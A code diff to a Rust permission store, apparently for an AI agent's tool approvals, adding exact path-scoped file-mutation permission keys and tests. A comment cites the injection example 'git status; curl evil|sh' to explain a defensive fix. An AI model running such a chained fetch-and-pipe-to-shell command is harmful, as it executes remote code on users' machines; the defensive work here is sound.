@@ -1,7 +1,7 @@
 use anyhow::{Context, Result};
 use serde::{Deserialize, Serialize};
 use std::collections::HashSet;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::sync::{LazyLock, Mutex};
 
 // AUDIT-FIX: C-2 — token-prefix match prevents `git status; curl evil|sh` slipping past a `git status` allow.
@@ -70,6 +70,45 @@ impl PermissionRule {
             pattern: pattern.into(),
             note: None,
         }
+    }
+}
+
+/// File-mutating operation names stored as exact, scoped permission keys.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum FilePermissionOperation {
+    Write,
+    Edit,
+    MultiEdit,
+    Patch,
+}
+
+impl FilePermissionOperation {
+    fn as_str(self) -> &'static str {
+        match self {
+            Self::Write => "write",
+            Self::Edit => "edit",
+            Self::MultiEdit => "multiedit",
+            Self::Patch => "patch",
+        }
+    }
+}
+
+fn file_permission_key(operation: FilePermissionOperation, path: &Path) -> Option<String> {
+    let normalized = if path.exists() {
+        path.canonicalize().unwrap_or_else(|_| path.to_path_buf())
+    } else if let (Some(parent), Some(name)) = (path.parent(), path.file_name()) {
+        parent
+            .canonicalize()
+            .map(|parent| parent.join(name))
+            .unwrap_or_else(|_| path.to_path_buf())
+    } else {
+        path.to_path_buf()
+    };
+    let display = normalized.to_string_lossy();
+    if display.trim().is_empty() {
+        None
+    } else {
+        Some(format!("file:{}:{}", operation.as_str(), display))
     }
 }
 
@@ -184,6 +223,40 @@ impl PermissionStore {
         self.check(command_program).or_else(|| self.check(base_cmd))
     }
 
+    /// Check a path-scoped file mutation rule. File rules use exact keys so
+    /// paths containing spaces are not interpreted as command tokens.
+    pub fn check_file(&self, operation: FilePermissionOperation, path: &Path) -> Option<bool> {
+        let key = file_permission_key(operation, path)?;
+        if self.always_deny.contains(&key) {
+            return Some(false);
+        }
+        if self.always_allow.contains(&key) || self.session_allow.contains(&key) {
+            return Some(true);
+        }
+        None
+    }
+
+    /// Check a multi-file operation. Every target must be allowed; any deny
+    /// wins; an empty target list has no saved permission match.
+    pub fn check_files(
+        &self,
+        operation: FilePermissionOperation,
+        paths: &[PathBuf],
+    ) -> Option<bool> {
+        if paths.is_empty() {
+            return None;
+        }
+
+        for path in paths {
+            match self.check_file(operation, path) {
+                Some(false) => return Some(false),
+                Some(true) => {}
+                None => return None,
+            }
+        }
+        Some(true)
+    }
+
     /// Add a command prefix to the "always allow" persistent list.
     #[allow(dead_code)]
     pub fn allow_always(&mut self, prefix: &str) {
@@ -203,6 +276,26 @@ impl PermissionStore {
     /// Add a command prefix to the process-wide session allow list.
     pub fn allow_session_for_process(&mut self, prefix: &str) {
         if let Some(rule) = normalize_rule(prefix) {
+            self.session_allow.insert(rule.clone());
+            PROCESS_SESSION_ALLOW
+                .lock()
+                .unwrap_or_else(|poisoned| poisoned.into_inner())
+                .insert(rule);
+        }
+    }
+
+    pub fn allow_file_always(&mut self, operation: FilePermissionOperation, path: &Path) {
+        if let Some(rule) = file_permission_key(operation, path) {
+            self.always_allow.insert(rule);
+        }
+    }
+
+    pub fn allow_file_session_for_process(
+        &mut self,
+        operation: FilePermissionOperation,
+        path: &Path,
+    ) {
+        if let Some(rule) = file_permission_key(operation, path) {
             self.session_allow.insert(rule.clone());
             PROCESS_SESSION_ALLOW
                 .lock()
@@ -355,14 +448,16 @@ impl PermissionStore {
                 v
             }
             "ask" => {
-                let mut v: Vec<String> =
-                    self.ask_list.iter().map(|r| r.pattern.clone()).collect();
+                let mut v: Vec<String> = self.ask_list.iter().map(|r| r.pattern.clone()).collect();
                 v.sort();
                 v
             }
             "workspace" => {
-                let mut v: Vec<String> =
-                    self.workspace_rules.iter().map(|r| r.pattern.clone()).collect();
+                let mut v: Vec<String> = self
+                    .workspace_rules
+                    .iter()
+                    .map(|r| r.pattern.clone())
+                    .collect();
                 v.sort();
                 v
             }
@@ -422,6 +517,47 @@ mod tests {
         store.allow_session("cargo build");
         assert_eq!(store.check("cargo build --release"), Some(true));
         assert_eq!(store.check("cargo test"), None);
+    }
+
+    #[test]
+    fn test_file_permission_rules_are_exact_and_operation_scoped() {
+        let mut store = PermissionStore::default();
+        let path = PathBuf::from("/workspace/src/main.rs");
+
+        store.allow_file_always(FilePermissionOperation::Write, &path);
+
+        assert_eq!(
+            store.check_file(FilePermissionOperation::Write, &path),
+            Some(true)
+        );
+        assert_eq!(store.check_file(FilePermissionOperation::Edit, &path), None);
+        assert_eq!(
+            store.check_file(
+                FilePermissionOperation::Write,
+                &PathBuf::from("/workspace/src/main.rs.bak")
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn test_file_permission_paths_with_spaces_are_exact() {
+        let mut store = PermissionStore::default();
+        let path = PathBuf::from("/workspace/path with spaces/file.rs");
+
+        store.allow_file_always(FilePermissionOperation::MultiEdit, &path);
+
+        assert_eq!(
+            store.check_file(FilePermissionOperation::MultiEdit, &path),
+            Some(true)
+        );
+        assert_eq!(
+            store.check_file(
+                FilePermissionOperation::MultiEdit,
+                &PathBuf::from("/workspace/path with spaces/file.rs.extra")
+            ),
+            None
+        );
     }
 
     #[test]
